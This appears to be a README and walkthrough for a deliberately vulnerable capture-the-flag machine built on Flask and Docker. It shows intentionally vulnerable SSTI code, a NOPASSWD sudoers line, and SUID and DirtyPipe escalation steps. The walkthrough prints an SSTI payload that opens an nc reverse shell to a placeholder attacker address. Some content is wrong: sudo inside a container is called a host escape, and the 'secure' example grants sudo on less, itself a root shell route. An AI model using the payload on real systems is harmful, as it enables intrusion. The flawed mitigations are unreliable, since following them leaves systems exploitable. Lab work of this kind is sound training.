# Dockerized Flask Hell - Medium CTF Machine

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Web%20%2B%20PrivEsc-blue)
![Platform](https://img.shields.io/badge/Platform-Docker%2FLinux-lightgrey)

A deliberately vulnerable CTF machine with:
- Flask Server-Side Template Injection (SSTI)
- Docker container escape
- Linux privilege escalation

## Table of Contents
1. [Quick Start](#quick-start)
2. [Vulnerabilities](#vulnerabilities)
   - [Flask SSTI](#1-flask-ssti---remote-code-execution)
   - [Docker Escape](#2-docker-escape---host-access)
   - [Privilege Escalation](#3-privilege-escalation---root)
3. [Exploitation Walkthrough](#exploitation-walkthrough)
4. [Mitigation Guide](#mitigation-guide)
5. [Flag Locations](#flag-locations)
6. [Educational Value](#educational-value)

---

## Quick Start
```bash
# Build and run
git clone https://github.com/your-repo/dockerized-flask-ctf.git
cd dockerized-flask-ctf
docker-compose up -d

# Access the web app
curl http://localhost:5000

## Vulnerabilities
### 1. Flask SSTI - Remote Code Execution

#### Vulnerable Code:

```Python
@app.route("/debug")
def debug():
    user_input = request.args.get('input', 'None')
    return render_template_string(f"Debug: {user_input}")  # SSTI here
    ```
#### Impact:

    Execute arbitrary commands as ctf user inside container.

### 2. Docker Escape - Host Access

Misconfiguration:

```Bash
RUN echo "ctf ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```
Impact:

    Break out of container to host system via sudo.

3. Privilege Escalation - Root

Attack Vectors:

    SUID Binary: /usr/bin/suid-wrapper (compiled with setuid(0))

    Kernel Exploit: DirtyPipe (CVE-2022-0847) in privileged container.

Exploitation Walkthrough
Step 1: Gain Initial Access (SSTI)

    Detect SSTI:
```http
http://localhost:5000/debug?input={{7*7}}
```
Output: Debug: 49
Get reverse shell:

```Python
{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f').read()}}
```
Step 2: Escape Docker Container

    Check containerization:
```Bash
cat /proc/1/cgroup | grep docker
```
Abuse sudo:
```Bash
sudo su  # No password required
```
Step 3: Privilege Escalation

Option A: SUID Binary
```bash
/usr/bin/suid-wrapper  # Spawns root shell
```
Option B: Kernel Exploit
```Bash
gcc dirtypipe.c -o exploit && ./exploit
```
Mitigation Guide
Vulnerability	Secure Configuration
SSTI	Use render_template() instead of render_template_string()
Docker Escape	Remove NOPASSWD in /etc/sudoers
Priv Esc	Patch kernel and avoid privileged: true in Docker

Secure Dockerfile Example:
```Dockerfile
USER ctf
RUN echo "ctf ALL=(ALL) /usr/bin/less" >> /etc/sudoers  # Restrict sudo
```
Flag Locations
Flag	Path	Unlock Condition
user.txt	/home/ctf/user.txt	After SSTI exploit
root.txt	/root/root.txt	After privilege escalation
Educational Value

Skills Learned:

    Web app testing (SSTI detection)

    Container security auditing

    Linux privilege escalation

Recommended Tools:

    linpeas.sh for host enumeration

    checksec for binary analysis

    docker inspect for container auditing